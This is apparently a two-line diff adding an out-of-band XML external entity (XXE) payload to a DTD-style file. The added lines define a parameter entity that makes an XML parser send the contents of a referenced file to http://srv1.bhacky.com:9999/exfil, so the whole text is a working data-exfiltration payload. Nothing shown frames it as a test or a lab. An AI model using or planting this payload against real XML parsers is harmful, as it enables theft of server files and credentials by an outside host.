@@ -1,0 +1,2 @@
+<!ENTITY % all "<!ENTITY &#37; send SYSTEM 'http://srv1.bhacky.com:9999/exfil?d=%file;'>">
+%all;
